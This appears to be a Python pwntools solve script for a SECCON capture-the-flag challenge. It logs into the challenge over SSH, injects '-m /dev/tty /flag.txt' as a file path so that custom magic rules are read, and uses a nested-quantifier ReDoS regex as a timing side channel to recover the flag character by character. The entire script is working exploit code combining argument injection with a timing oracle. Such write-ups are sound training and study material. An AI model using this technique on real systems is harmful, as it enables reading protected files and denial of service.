import string
import os
import pwn
import time

REDOS_POWER = 20
TIMEOUT = 20

SSH_CMD = f"sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@{os.getenv('SECCON_HOST')} -p {os.getenv('SECCON_PORT')}"


def get_time(rule: str) -> bool:
    io = pwn.process(SSH_CMD, shell=True, stdin=pwn.PTY, raw=False)
    io.sendlineafter(b"Input a file path: ", b"-m /dev/tty /flag.txt")
    io.sendline(rule.encode())
    for i in range(REDOS_POWER):
        io.sendline(f">0 regex \\^(((((((((((((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*@ ReDoS-{i}".encode())
    io.recvuntil(f"ReDoS-{REDOS_POWER - 1}".encode(), timeout=TIMEOUT)
    io.send("\x04")  # Ctrl+D

    t1 = time.time()
    io.recvall(timeout=TIMEOUT)
    t2 = time.time()
    io.close()
    return t2 - t1


def get_rule(index: int, next_chars: str) -> str:
    def escape(s): return s.replace("{", "\\\\{").replace("}", "\\\\}")
    expr = "".join([
        "\\^",
        "[",
        escape(next_chars),
        "]"
    ])
    return f"{index} regex {expr}"


CHARS = "_}" + string.ascii_letters + string.digits

flag = "SECCON{"
while not flag.endswith("}"):
    left = 0
    right = len(CHARS)
    while right - left > 1:
        mid = (left + right)//2
        t_left = get_time(get_rule(len(flag), CHARS[:mid]))
        t_right = get_time(get_rule(len(flag), CHARS[mid:]))
        print(f"{t_left = }, {t_right = }")
        if t_left > t_right:
            right = mid
        else:
            left = mid
    flag += CHARS[left]
    print(flag)
print(f"{flag = }")
